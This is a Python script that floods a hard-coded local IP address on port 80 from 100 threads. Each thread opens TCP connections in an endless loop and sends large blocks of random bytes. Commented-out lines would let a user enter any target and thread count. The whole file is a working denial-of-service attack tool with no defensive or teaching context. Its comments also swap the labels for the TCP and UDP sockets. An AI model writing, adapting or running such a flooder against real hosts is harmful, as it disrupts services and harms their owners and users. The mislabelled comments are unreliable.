import sys
import os
import time
import socket
import random
import threading

def func(ip,port):
     sent=0
     while True:
          sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#Udp
          #sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)#tcp
          bytes = random._urandom(65496)
          #bytes = random._urandom(1460)
          sock.connect((ip,port))
          #sock.sendto(bytes, (ip,port))
          sock.send(bytes)
          print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
          sent=sent+1

ip="192.168.0.120"
port=80
t_number=100
#ip = input("IP Target : ")
#port = input("Port : ")
#t_number=input("thread number : ")
t_number=int(t_number)
port=int(port)
threads=[]
for i in range(t_number):
     threads.append(threading.Thread(target=func,args=(ip,port,)))
     threads[i].start()




